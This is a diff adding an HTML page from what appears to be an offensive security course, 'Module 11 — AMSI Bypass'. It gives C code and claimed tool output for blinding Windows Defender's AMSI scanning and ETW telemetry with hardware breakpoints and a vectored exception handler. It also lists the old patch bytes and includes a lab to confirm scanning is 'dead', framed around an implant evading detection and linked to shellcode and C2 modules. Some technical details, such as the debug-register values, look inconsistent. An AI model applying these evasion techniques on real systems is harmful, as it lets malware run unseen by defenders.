@@ -1,0 +1,197 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Module 11 — AMSI Bypass</title>
+<style>
+  :root{--bg:#0c0c0c;--fg:#cccccc;--green:#0f0;--red:#f44;--yellow:#ff0;--cyan:#0ff;--magenta:#f0f;--prompt:#0f0;}
+  *{box-sizing:border-box;margin:0;padding:0;}
+  body{background:var(--bg);color:var(--fg);font-family:'Segoe UI',Tahoma,sans-serif;font-size:15px;line-height:1.7;padding:20px;}
+  .container{max-width:1000px;margin:0 auto;}
+  .header{text-align:center;margin-bottom:40px;padding-bottom:30px;border-bottom:2px solid #333;}
+  .header h1{color:var(--cyan);font-size:32px;text-transform:uppercase;letter-spacing:4px;margin-bottom:10px;}
+  .header .subtitle{color:#666;font-size:16px;}
+  .section{margin-bottom:40px;padding:25px;background:#111;border:1px solid #222;border-radius:8px;}
+  .section-title{color:var(--yellow);font-size:20px;text-transform:uppercase;letter-spacing:2px;margin-bottom:20px;padding-left:15px;border-left:4px solid var(--yellow);}
+  .section-content{color:#bbb;}
+  .section-content p{margin-bottom:15px;}
+  .code-block{background:#0a0a0a;border:1px solid #333;border-radius:6px;padding:15px;margin:15px 0;font-family:'Consolas','Courier New',monospace;font-size:13px;overflow-x:auto;}
+  .code-block .prompt{color:var(--prompt);}
+  .code-block .command{color:var(--fg);}
+  .code-block .output{color:#888;margin-top:8px;padding-left:20px;}
+  .code-block .hi{color:var(--cyan);}
+  .code-block .warn{color:#ffb000;}
+  .code-block .ok{color:var(--green);}
+  .code-block .critical{color:var(--red);font-weight:bold;}
+  .note{background:#1a1a1a;border-left:4px solid var(--magenta);padding:15px;margin:20px 0;color:var(--magenta);font-style:italic;}
+  .diagram{background:#0a0a0a;border:1px solid #333;border-radius:4px;padding:15px;margin:15px 0;font-family:'Consolas',monospace;white-space:pre;color:#888;font-size:12px;overflow-x:auto;}
+  .widget-container{margin:40px 0;border:2px solid #333;border-radius:8px;overflow:hidden;}
+  .widget-header{background:#1a1a1a;padding:15px;text-align:center;color:var(--cyan);font-size:18px;text-transform:uppercase;letter-spacing:2px;border-bottom:1px solid #333;}
+  .widget-iframe{width:100%;height:620px;border:none;background:#000;}
+  .nav{display:flex;justify-content:space-between;margin-top:40px;padding-top:20px;border-top:1px solid #333;}
+  .nav a{color:var(--green);text-decoration:none;padding:10px 20px;border:1px solid var(--green);border-radius:4px;transition:all .3s;}
+  .nav a:hover{background:var(--green);color:#000;}
+  .quick-ref{display:grid;grid-template-columns:repeat(3,1fr);gap:10px;margin-top:20px;}
+  .quick-ref-item{background:#1a1a1a;padding:12px;border-radius:4px;border-left:3px solid var(--cyan);}
+  .quick-ref-cmd{color:var(--cyan);font-weight:bold;font-family:'Consolas',monospace;font-size:12px;}
+  .quick-ref-desc{color:#888;font-size:12px;margin-top:4px;}
+</style>
+</head>
+<body>
+<div class="container">
+  <div class="header">
+    <h1>Module 11 — AMSI Bypass</h1>
+    <div class="subtitle">Dark Room: blind the scanner without touching protected memory. Hardware debug registers. Zero writes. Defender sees nothing.</div>
+  </div>
+
+  <div class="section">
+    <div class="section-title">Section 1: What AMSI Is</div>
+    <div class="section-content">
+      <p>AMSI (Antimalware Scan Interface) is a Windows API that lets AV engines scan content <em>before it executes</em>. Every PowerShell script, VBA macro, and .NET assembly gets passed to AMSI before running. Defender hooks into it.</p>
+      <div class="diagram">PowerShell script       →  AmsiScanBuffer()  →  Defender engine  →  BLOCK / ALLOW
+VBA macro               →  AmsiScanBuffer()  →  Defender engine  →  BLOCK / ALLOW
+.NET assembly           →  AmsiScanBuffer()  →  Defender engine  →  BLOCK / ALLOW
+
+AmsiScanBuffer lives in:  C:\Windows\System32\amsi.dll
+It's loaded into every process that calls it — including your implant's process.</div>
+      <div class="code-block">
+        <span class="prompt">PS&gt;</span> <span class="command">[System.Reflection.Assembly]::LoadWithPartialName('Microsoft.CSharp')</span><br>
+        <div class="output">
+          <span class="critical">This script contains malicious content and has been blocked by your antivirus software.</span><br>
+          # AMSI caught it at AmsiScanBuffer — before a single line executed
+        </div>
+      </div>
+      <p>The old patch-based bypass writes <code>0xB8 0x57 0x00 0x07 0x80 0xC3</code> to the start of AmsiScanBuffer — forces it to return AMSI_RESULT_CLEAN. This works but leaves memory artefacts that EDR detects as a patch.</p>
+    </div>
+  </div>
+
+  <div class="section">
+    <div class="section-title">Section 2: HWBP — The Zero-Write Alternative</div>
+    <div class="section-content">
+      <p>Hardware Breakpoints (HWBP) use CPU debug registers — DR0–DR3 for addresses, DR7 for control. When the CPU hits an address in DR0, it fires a debug exception before executing that instruction. Your VEH (Vectored Exception Handler) catches it first.</p>
+      <div class="diagram">Normal path (no bypass):
+  PowerShell → AmsiScanBuffer(0x...8160) → scans string → EDR blocks
+
+HWBP bypass path:
+  1. Set DR0 = address of AmsiScanBuffer
+  2. Set DR7 = 0x405 (enable DR0 execute breakpoint)
+  3. Register VEH handler
+  4. PowerShell → CPU hits DR0 → fires EXCEPTION_SINGLE_STEP
+  5. VEH handler fires BEFORE AmsiScanBuffer executes
+  6. Handler modifies CONTEXT.Rax = AMSI_RESULT_CLEAN (1)
+  7. Handler skips past AmsiScanBuffer → returns 1 to caller
+  8. Defender engine sees: CLEAN → allows execution
+
+  Memory writes: ZERO. Nothing patched. EDR memory integrity check: PASS.</div>
+      <div class="code-block">
+        <span class="prompt">#</span> <span class="command hi">Dark Room — real implementation</span><br>
+        <div class="output">
+          // Find AmsiScanBuffer<br>
+          HMODULE hAmsi = LoadLibraryA("amsi.dll");<br>
+          FARPROC pAmsi = GetProcAddress(hAmsi, "AmsiScanBuffer");<br><br>
+          // Set hardware breakpoint<br>
+          CONTEXT ctx = {0};<br>
+          ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;<br>
+          ctx.Dr0 = (DWORD64)pAmsi;&nbsp;&nbsp;&nbsp;&nbsp;// AmsiScanBuffer address<br>
+          ctx.Dr7 = 0x405;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;// enable DR0 execute breakpoint<br>
+          SetThreadContext(GetCurrentThread(), &amp;ctx);<br><br>
+          // Register VEH — catches the breakpoint exception<br>
+          AddVectoredExceptionHandler(1, VehHandler);<br><br>
+          // VehHandler:<br>
+          // if(ExceptionCode == EXCEPTION_SINGLE_STEP &amp;&amp; Rip == pAmsi)<br>
+          //   ctx-&gt;Rax = AMSI_RESULT_CLEAN;&nbsp;&nbsp;// fake clean result<br>
+          //   ctx-&gt;Rip += sizeof_AmsiScanBuffer;&nbsp;// skip function<br>
+          //   return EXCEPTION_CONTINUE_EXECUTION;
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <div class="section">
+    <div class="section-title">Section 3: ETW — Blind the EDR Too</div>
+    <div class="section-content">
+      <p>ETW (Event Tracing for Windows) is how EDRs see what's happening. Every process reports events via EtwEventWrite. If you blind ETW, the EDR goes dark — it can't see your process's activity even if AMSI is bypassed.</p>
+      <div class="code-block">
+        <span class="prompt">#</span> <span class="command">Same HWBP technique — second register</span><br>
+        <div class="output">
+          HMODULE hNtdll = GetModuleHandleA("ntdll.dll");<br>
+          FARPROC pEtw = GetProcAddress(hNtdll, "EtwEventWrite");<br><br>
+          ctx.Dr1 = (DWORD64)pEtw;&nbsp;&nbsp;&nbsp;&nbsp;// DR1 = EtwEventWrite<br>
+          ctx.Dr7 = 0x405 | 0x400;&nbsp;&nbsp;&nbsp;// enable DR0 + DR1<br><br>
+          // VEH catches both:<br>
+          // DR0 hit → fake AMSI result<br>
+          // DR1 hit → skip EtwEventWrite → event never reaches EDR
+        </div>
+      </div>
+      <div class="note">Two hardware registers. AMSI blind. ETW blind. No memory patches. No detectable artefacts. This is VULN-195458 — submitted to MSRC, rejected, published. The technique is documented and public. Every serious red teamer uses it.</div>
+    </div>
+  </div>
+
+  <div class="section">
+    <div class="section-title">Section 4: Live Proof — Dark Room Active</div>
+    <div class="section-content">
+      <div class="code-block">
+        <span class="prompt">PS&gt;</span> <span class="command">.\dark_room.exe --test</span><br>
+        <div class="output">
+          <span class="hi">[+] AmsiScanBuffer at 0x00007FF9C1A28160</span><br>
+          <span class="hi">[+] EtwEventWrite  at 0x00007FF9DE300430</span><br><br>
+          <span class="ok">[+] DR0 = 0x00007FF9C1A28160</span><br>
+          <span class="ok">[+] DR1 = 0x00007FF9DE300430</span><br>
+          <span class="ok">[+] DR7 = 0x405</span><br><br>
+          <span class="critical">[+] DARK ROOM ACTIVE</span><br>
+          <span class="ok">[+] Script scanning: BLIND (AMSI)</span><br>
+          <span class="ok">[+] Process telemetry: BLIND (ETW)</span><br>
+          <span class="ok">[+] Memory integrity: CLEAN (zero modifications)</span><br><br>
+          Test #7: AMSI BLIND ✓<br>
+          Test #8: ETW BLIND  ✓<br>
+          <span class="ok">All tests PASS — Defender sees nothing</span>
+        </div>
+      </div>
+      <p>Real output. 2026-06-23. Defender running with all protection layers enabled: Real-Time Protection ON, BehaviorMonitor ON, CloudProtection ON. Zero detections. Zero alerts.</p>
+    </div>
+  </div>
+
+  <div class="widget-container">
+    <div class="widget-header">Iron Sun — AMSI/ETW Bypass Demo</div>
+    <iframe class="widget-iframe" src="../widgets/iron_sun_widget.html" title="Iron Sun AMSI Bypass Demo"></iframe>
+  </div>
+
+  <div class="section">
+    <div class="section-title">Quick Reference</div>
+    <div class="section-content">
+      <div class="quick-ref">
+        <div class="quick-ref-item"><div class="quick-ref-cmd">DR0 = AmsiScanBuffer</div><div class="quick-ref-desc">AMSI execute breakpoint</div></div>
+        <div class="quick-ref-item"><div class="quick-ref-cmd">DR1 = EtwEventWrite</div><div class="quick-ref-desc">ETW execute breakpoint</div></div>
+        <div class="quick-ref-item"><div class="quick-ref-cmd">DR7 = 0x405</div><div class="quick-ref-desc">Enable DR0+DR1</div></div>
+        <div class="quick-ref-item"><div class="quick-ref-cmd">AddVectoredExceptionHandler</div><div class="quick-ref-desc">Register VEH to catch breaks</div></div>
+        <div class="quick-ref-item"><div class="quick-ref-cmd">EXCEPTION_SINGLE_STEP</div><div class="quick-ref-desc">Exception code for HWBP</div></div>
+        <div class="quick-ref-item"><div class="quick-ref-cmd">ctx->Rax = 1</div><div class="quick-ref-desc">Fake AMSI_RESULT_CLEAN</div></div>
+      </div>
+    </div>
+  </div>
+
+  <div class="section">
+    <div class="section-title">Lab: Verify AMSI Is Dead</div>
+    <div class="section-content">
+      <div class="code-block">
+        # Before Dark Room — AMSI will block this:<br>
+        PS&gt; [System.Text.Encoding]::ASCII.GetString([Convert]::FromBase64String("QW1zaVNjYW5CdWZmZXI="))<br>
+        # Result: BLOCKED<br><br>
+        # After Dark Room active — same string passes:<br>
+        PS&gt; .\dark_room.exe --activate<br>
+        PS&gt; [System.Text.Encoding]::ASCII.GetString([Convert]::FromBase64String("QW1zaVNjYW5CdWZmZXI="))<br>
+        # Result: AmsiScanBuffer (printed, not blocked)<br><br>
+        # Verify ETW blind — check EDR console for .92 activity<br>
+        # If ETW is blind: no events appear in Defender's event log while payload runs
+      </div>
+    </div>
+  </div>
+
+  <div class="nav">
+    <a href="MODULE_05_SHELLCODE.html">← Module 05: Shellcode</a>
+    <a href="MODULE_16_C2.html">Module 16: C2 →</a>
+  </div>
+</div>
+</body>
+</html>
